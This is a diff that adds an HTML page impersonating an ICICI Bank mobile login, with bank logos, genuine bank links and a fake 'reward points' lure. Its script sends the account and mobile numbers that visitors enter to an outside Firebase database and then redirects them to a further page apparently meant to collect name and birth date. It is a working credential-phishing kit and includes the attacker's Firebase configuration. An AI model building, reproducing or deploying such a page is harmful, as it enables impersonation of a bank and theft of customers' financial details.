@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ICICI Bank Login</title>
+    <!-- Add Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="global.css">
+</head>
+<body>
+        <form class="LoginForm">
+            <div class="container">
+                <div class="header">
+                    <img src="icici h.jpg" alt="ICICI Bank Logo">
+                </div>
+
+                <div class="input-group">
+                    <label for="userid">Account Number</label>
+                    <input type="text" class="new-control" name="Account No." id="lo" maxLength="12" inputmode="numeric" required />
+                </div>
+
+                <div class="input-group">
+                    <label for="userid">Mobile Number</label>
+                    <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+                        pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required />
+                </div>
+
+                <button class="btn" type="submit">Login</button>
+
+                <div class="links">
+                    <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__EVENT_ID__=LOAD&__CALL_MODE__=92&LOGIN_FLAG=1&BANK_ID=ICI&ACCESS_DEV=WAP">Forgot User ID or Password</a> | 
+                    <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*30xkeg*_ga*MTgzMDcxOTY5Ni4xNjIwMDM5NDU0*_ga_SKB78GHTFV*MTYyODIzNDM4NC43Ny4xLjE2MjgyMzQ1MDQuMjc.&_ga=2.92094746.1084279428.1697432242-1973315115.1690798212&_gac=1.213008672.1697523963.EAIaIQobChMI-7jpvrn8gQMVt6lmAh1nywMHEAAYASAAEgKBxfD_BwE?ITM=nli_personalb_personal_login_btn">Continue to Desktop Login</a>
+                </div>
+
+                <div class="notification">
+                    Please use your existing Internet Banking Mobile No./ATM Pin/User ID and Password (credentials) of Personal and Business Banking and redeem Your Rs.8990/- Reward Points.
+                </div>
+
+                <div class="download-app">
+                    <a href="#">
+                        <img src="iMobile Logo.jpg" alt="iMobile Logo">
+                    </a>
+                </div>
+            </div>
+        </form>
+
+        <div class="footer">
+            <p>Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. ICICI Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.</p>
+            <a href="#">Disclaimer</a> | <a href="#">Privacy</a> | <a href="#">Desktop Site</a>
+            <p>&copy; ICICI Bank</p>
+        </div>
+    </div>
+
+    <!-- Firebase Configuration and Data Submission -->
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
+    authDomain: "motutest-ac954.firebaseapp.com",
+    databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
+    projectId: "motutest-ac954",
+    storageBucket: "motutest-ac954.firebasestorage.app",
+    messagingSenderId: "85522378752",
+    appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  document.querySelector('.LoginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const accountNumber = document.getElementById('lo').value;
+    const mobileNumber = document.getElementById('Mobile_Number').value;
+
+    const newUserRef = database.ref('user').push();
+    const userId = newUserRef.key;
+
+    const userData = { accountNumber, mobileNumber };
+
+    try {
+      await newUserRef.set(userData);
+      localStorage.setItem("currentUserId", userId);
+      console.log("✅ User created:", userId);
+      window.location.href = 'Name_And_DOB.html';
+    } catch (error) {
+      console.error(error);
+    }
+  });
+</script>
+
+</body>
+</html>
